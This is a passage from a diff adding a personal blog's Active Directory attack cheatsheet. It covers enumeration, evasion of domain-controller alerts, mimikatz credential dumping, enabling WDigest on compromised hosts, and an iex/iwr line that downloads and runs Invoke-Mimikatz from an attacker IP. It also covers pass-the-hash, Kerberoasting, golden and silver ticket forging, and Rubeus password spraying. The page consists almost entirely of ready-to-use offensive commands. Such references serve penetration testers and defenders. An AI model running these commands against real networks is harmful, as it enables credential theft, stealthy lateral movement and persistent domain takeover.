+<td><code>UF_TEMP_DUPLICATE_ACCOUNT</code></td>
+<td>256</td>
+</tr>
+<tr>
+<td>Normal Account</td>
+<td><code>UF_NORMAL_ACCOUNT</code></td>
+<td>512</td>
+</tr>
+<tr>
+<td>Interdomain Trust Account</td>
+<td><code>UF_INTERDOMAIN_TRUST_ACCOUNT</code></td>
+<td>2048</td>
+</tr>
+<tr>
+<td>Workstation Trust Account</td>
+<td><code>UF_WORKSTATION_TRUST_ACCOUNT</code></td>
+<td>4096</td>
+</tr>
+<tr>
+<td>Server Trust Account</td>
+<td><code>UF_SERVER_TRUST_ACCOUNT</code></td>
+<td>8192</td>
+</tr>
+</tbody>
+</table>
+<p>Example:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_useraccount</span> <span class="n">-Filter</span> <span class="s1">'accounttype=512'</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">accounttype</span>
+</code></pre></div>
+<p>Filter users by domain:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_useraccount</span> <span class="n">-Filter</span> <span class="s1">'domain="&lt;domain name&gt;"'</span> <span class="p">|</span> <span class="nb">select </span><span class="n">caption</span>
+</code></pre></div>
+<p>Enumerating currently logged-on users:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_loggedonuser</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span><span class="no">[wmi]</span><span class="nv">$_</span><span class="p">.</span><span class="n">antecedent</span><span class="p">}</span>
+</code></pre></div>
+<p>Enumerating groups for a domain:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_groupindomain</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span><span class="no">[wmi]</span><span class="nv">$_</span><span class="p">.</span><span class="n">partcomponent</span><span class="p">}</span>
+</code></pre></div>
+<p>Enumerating group memberships:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_groupuser</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">groupcomponent</span> <span class="o">-match</span> <span class="s1">'&lt;goup name&gt;'</span> <span class="p">}</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span><span class="no">[wmi]</span><span class="nv">$_</span><span class="p">.</span><span class="n">partcomponent</span><span class="p">}</span>
+</code></pre></div>
+<p>Enumerate all the machines in the domain:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">directory</span><span class="p">\</span><span class="n">ldap</span> <span class="n">-Class</span> <span class="n">ds_computer</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ds_cn</span>
+</code></pre></div>
+<p>Enumerate antivirus:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="n">securitycenter2</span> <span class="n">-Class</span> <span class="n">antivirusproduct</span>
+</code></pre></div>
+<h3 id="sharphound_1">Sharphound</h3>
+<p>Collect information for <code>Bloodhound</code>:</p>
+<div class="highlight"><pre><span></span><code>Sharphound.exe<span class="w"> </span>--CollectionMethods<span class="w"> </span>&lt;Methods&gt;<span class="w"> </span>--Domain<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--ExcludeDCs
+</code></pre></div>
+<p>Where:</p>
+<ul>
+<li><strong>CollectionMethods</strong>: Determines what kind of data <code>sharphound</code> would collect. The most common options are Default or All. Also, since <code>sharphound</code> caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.</li>
+<li><strong>Domain</strong> - The domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.</li>
+<li><strong>ExcludeDCs</strong> -This will instruct <code>sharphound</code> not to touch domain controllers, which reduces the likelihood that the <code>sharphound</code> run will raise an alert.</li>
+</ul>
+<p>References:</p>
+<ul>
+<li><a href="https://github.com/BloodHoundAD/SharpHound">Sharphound</a></li>
+</ul>
+<h2 id="lateral-movements_1">Lateral Movements</h2>
+<h3 id="dumping-credentials">Dumping Credentials</h3>
+<p>Dumping credentials with mimikatz:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Must return "Privilege '20' OK" </span>
+privilege::debug
+
+sekurlsa::logonpasswords
+</code></pre></div>
+<p>Enable WDigest authentication on a compromised server:</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span>HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\S</span>ecurityProviders<span class="se">\W</span>Digest<span class="w"> </span>/v<span class="w"> </span>UseLogonCredential<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="m">1</span>
+</code></pre></div>
+<p>Dump Wdigest passwords:</p>
+<div class="highlight"><pre><span></span><code>sekurlsa::wdigest
+</code></pre></div>
+<p>Try dumping SAM database (doesn't always work):</p>
+<div class="highlight"><pre><span></span><code>lsadump::sam
+
+<span class="c1"># if previous command returned an error try</span>
+lsadump::sam<span class="w"> </span>/patch
+</code></pre></div>
+<p>Try dumping credentials from LSA (lsass.exe) process:</p>
+<div class="highlight"><pre><span></span><code>lsadump::lsa<span class="w"> </span>/patch
+</code></pre></div>
+<p>If none of the previous commands worked, try to impersonate <strong>NT AUTHORITY\SYSTEM</strong> - see <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#token-impersonation-mimikatz">Token Impersonation with mimikatz</a>.</p>
+<p>Use PowerSploit Invoke-Mimikatz.ps1 script to run mimikatz in memory:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">iex </span><span class="p">(</span><span class="nb">iwr </span><span class="n">-UseBasicParsing</span> <span class="n">http</span><span class="p">://&lt;</span><span class="n">attacker</span> <span class="n">ip</span><span class="p">&gt;/</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="n">Inovke-Mimikatz</span> <span class="n">-Command</span> <span class="s2">"&lt;mimikatz command(s)&gt;"</span>
+</code></pre></div>
+<p>If the "AmbiguousMatchException" is raised, try to patch the Invoke-Mimikatz.ps1 script as follows:</p>
+<ul>
+<li>Change the following line:   <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code></li>
+<li>To: <code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</code></li>
+</ul>
+<p>Reference: <a href="https://github.com/mitre/caldera/issues/38#issuecomment-396055260">https://github.com/mitre/caldera/issues/38#issuecomment-396055260</a></p>
+<h3 id="pass-the-password-pass-the-hash">Pass-the-password &amp; Pass-the-hash</h3>
+<p>Perform a pass-the-password attack:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Deprecated</span>
+crackmapex<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;
+
+<span class="c1"># Use netexec instead</span>
+nxc<span class="w"> </span>&lt;protocol&gt;<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;
+</code></pre></div>
+<p>Perform a pass-the-hash attack:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Deprecated</span>
+crackmapex<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>account<span class="w"> </span>username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>account<span class="w"> </span>password<span class="w"> </span>hash&gt;<span class="w"> </span>--local
+
+<span class="c1"># Use netexec instead</span>
+nxc<span class="w"> </span>&lt;protocol&gt;<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>account<span class="w"> </span>username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>account<span class="w"> </span>password<span class="w"> </span>hash&gt;<span class="w"> </span>--local-auth
+</code></pre></div>
+<p>Dump SAM database on pwned targets:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Deprecated</span>
+crackmapex<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--sam
+
+<span class="c1"># use netexec instead</span>
+nxc<span class="w"> </span>smb<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--sam
+</code></pre></div>
+<p>Dump all available credentials with impacket's <code>secretdump.py</code> script:</p>
+<div class="highlight"><pre><span></span><code>secretdump.py<span class="w"> </span><span class="o">[[</span>domain/<span class="o">]</span>username<span class="o">[</span>:password<span class="o">]</span>@<span class="o">]</span>&lt;targetName<span class="w"> </span>or<span class="w"> </span>address&gt;
+</code></pre></div>
+<p>For more credentials dumping, take a look at:</p>
+<ul>
+<li><a href="https://www.netexec.wiki/smb-protocol/obtaining-credentials">Obtaining Credentials | NetExec</a></li>
+</ul>
+<h3 id="token-impersonation">Token Impersonation</h3>
+<h4 id="token-impersonation-metasploit">Token Impersonation: Metasploit</h4>
+<p>In metasploit, load incognito module:</p>
+<div class="highlight"><pre><span></span><code>load<span class="w"> </span>incognito
+</code></pre></div>
+<p>List tokens that is possible to impersonate:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># By username</span>
+list_tokens<span class="w"> </span>-u
+
+<span class="c1"># By Group</span>
+list_tokens<span class="w"> </span>-g
+</code></pre></div>
+<p>Impersonate token:</p>
+<div class="highlight"><pre><span></span><code>impersonate_token<span class="w"> </span>&lt;user<span class="p">|</span>group&gt;
+</code></pre></div>
+<p>*Note: double the slash to escape the slash.</p>
+<p>Revert to starting user:</p>
+<div class="highlight"><pre><span></span><code>rev2self
+</code></pre></div>
+<h4 id="token-impersonation-mimikatz">Token Impersonation: Mimikatz</h4>
+<p>With mimikatz, check current token:</p>
+<div class="highlight"><pre><span></span><code>token::whoami
+</code></pre></div>
+<p>List token available for being impersonated:</p>
+<div class="highlight"><pre><span></span><code>token::list
+</code></pre></div>
+<p>Impersonate token:</p>
+<div class="highlight"><pre><span></span><code>token::elevate /id:&lt;token id&gt;
+</code></pre></div>
+<p>Try impersonate <strong>NT AUTHORITY\SYSTEM</strong> account:</p>
+<div class="highlight"><pre><span></span><code>token::elevate
+</code></pre></div>
+<p>References:</p>
+<ul>
+<li><a href="https://tools.thehacker.recipes/mimikatz/modules/token/elevate">TheHackerRecipes - Mimikatz - Elevate</a></li>
+</ul>
+<h3 id="kerberoasting_1">Kerberoasting</h3>
+<p>Find an SPN account(s) using impacket's <code>GetUserSPNs</code> script:</p>
+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;
+
+<span class="c1"># Directly request for each found SPN account the TGS (so skip next command)</span>
+python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request<span class="w"> </span>
+</code></pre></div>
+<p>Request TGS for the found SPN account(s):</p>
+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DC<span class="w"> </span>IP<span class="w"> </span>address&gt;<span class="w"> </span>&lt;domain/owned<span class="w"> </span>user&gt;<span class="w"> </span>-request-user<span class="w"> </span>&lt;found<span class="w"> </span>SPN<span class="w"> </span>account&gt;
+</code></pre></div>
+<p>Try cracking the obtained TGS by using hascat:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>&lt;other<span class="w"> </span>options&gt;<span class="w"> </span>&lt;<span class="nb">hash</span><span class="w"> </span>file&gt;<span class="w"> </span>&lt;wordlist&gt;
+</code></pre></div>
+<p>If the "Clock skew too great" error is obtained, sync the attacking machine with the DC:</p>
+<div class="highlight"><pre><span></span><code>ntpdate<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;
+</code></pre></div>
+<p>or use <code>faketime</code> when launching <code>GetUserSPNs</code> script (useful when cannot update attacking machine system date):</p>
+<div class="highlight"><pre><span></span><code>faketime<span class="w"> </span><span class="s2">"</span><span class="k">$(</span>sudo<span class="w"> </span>ntpdate<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">'('</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="k">)</span><span class="s2">"</span>
+</code></pre></div>
+<h2 id="persistence_1">Persistence</h2>
+<h3 id="golden-silver-tickets">Golden &amp; Silver Tickets</h3>
+<p>Retrieve information needed to forge a Golden Ticket with Mimikatz:</p>
+<div class="highlight"><pre><span></span><code>lsadump::lsa<span class="w"> </span>/inject<span class="w"> </span>/name<span class="w"> </span>krbtgt
+</code></pre></div>
+<p>Take note of:</p>
+<ul>
+<li>The domain SID</li>
+<li>The krbtgt account's password hash</li>
+</ul>
+<p>Generate a golden ticket:</p>
+<div class="highlight"><pre><span></span><code>kerberos::golden<span class="w"> </span>/admin:&lt;Any<span class="w"> </span>user&gt;<span class="w"> </span>/domain:&lt;Domain&gt;<span class="w"> </span>/id:500<span class="w"> </span>/sid:&lt;Domain<span class="w"> </span>SID&gt;<span class="w"> </span>/krbtgt:&lt;NTLM<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>of<span class="w"> </span>KRBTGT<span class="w"> </span>account&gt;<span class="w"> </span>/endin:600<span class="w"> </span>/renewmax:10080<span class="w"> </span>/ptt
+</code></pre></div>
+<p>Where:</p>
+<ul>
+<li><strong>/admin</strong> - The username to impersonate. This does not have to be a valid user.  </li>
+<li><strong>/domain</strong> - The FQDN of the domain to generate the ticket for.  </li>
+<li><strong>/id</strong> -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  </li>
+<li><strong>/sid</strong> -The SID of the domain to generate the ticket for.</li>
+<li><strong>/krbtgt</strong> -The NTLM hash of the KRBTGT account.   </li>
+<li><strong>/endin</strong> - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  </li>
+<li><strong>/renewmax</strong> -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  </li>
+<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used (Pass-the-Ticket).</li>
+</ul>
+<p>Generate a silver ticket:</p>
+<div class="highlight"><pre><span></span><code>kerberos::golden<span class="w"> </span>/admin:&lt;Any<span class="w"> </span>user&gt;<span class="w"> </span>/domain:&lt;Domain&gt;<span class="w"> </span>/id:500<span class="w"> </span>/sid:&lt;Domain<span class="w"> </span>SID&gt;<span class="w"> </span>/target:&lt;Hostname<span class="w"> </span>of<span class="w"> </span>server<span class="w"> </span>being<span class="w"> </span>targeted&gt;<span class="w"> </span>/rc4:&lt;NTLM<span class="w"> </span>Hash<span class="w"> </span>of<span class="w"> </span>machine<span class="w"> </span>account<span class="w"> </span>of<span class="w"> </span>target&gt;<span class="w"> </span>/service:cifs<span class="w"> </span>/ptt
+</code></pre></div>
+<p>Where:</p>
+<ul>
+<li><strong>/admin</strong> - The username we want to impersonate. This does not have to be a valid user.  </li>
+<li><strong>/domain</strong> - The FQDN of the domain we want to generate the ticket for.  </li>
+<li><strong>/id</strong> -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  </li>
+<li><strong>/sid</strong> -The SID of the domain we want to generate the ticket for.</li>
+<li><strong>/target</strong> - The hostname of our target server.It can be any domain-joined host.  </li>
+<li><strong>/rc4</strong> - The NTLM hash of the machine account of our target. </li>
+<li><strong>/service</strong> - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.  </li>
+<li><strong>/ptt</strong> - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.</li>
+</ul>
+<p>Open a shell with the injected ticket:</p>
+<div class="highlight"><pre><span></span><code>misc::shell
+</code></pre></div>
+<h2 id="kerberos_1">Kerberos</h2>
+<p>Brute-force user accounts from a domain controller using a supplied wordlist:</p>
+<div class="highlight"><pre><span></span><code><span class="n">kerbrute</span><span class="w"> </span><span class="n">userenum</span><span class="w"> </span><span class="o">--</span><span class="n">dc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">domain</span><span class="w"> </span><span class="n">controller</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">wordlist</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Make Rubeus harvest for TGTs every 30 seconds:</p>
+<div class="highlight"><pre><span></span><code>Rubeus.exe harvest /interval:30
+</code></pre></div>
+<p>Rubeus password spraying:</p>
+<div class="highlight"><pre><span></span><code>Rubeus.exe brute /password:Password1 /noticket
+</code></pre></div>
+<p>Dump Kerberos hash for of every kerberoastable users (only service accounts):</p>
+<div class="highlight"><pre><span></span><code>Rubeus.exe kerberoast
+</code></pre></div>
+<p>Run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes:</p>
+<div class="highlight"><pre><span></span><code>Rubeus.exe asreproast
+</code></pre></div>
+<h2 id="misc">Misc</h2>
+<p>Force computer policy sync with DC:</p>
+<div class="highlight"><pre><span></span><code><span class="n">gpupdate</span> <span class="p">/</span><span class="n">force</span>
+</code></pre></div>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2024 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
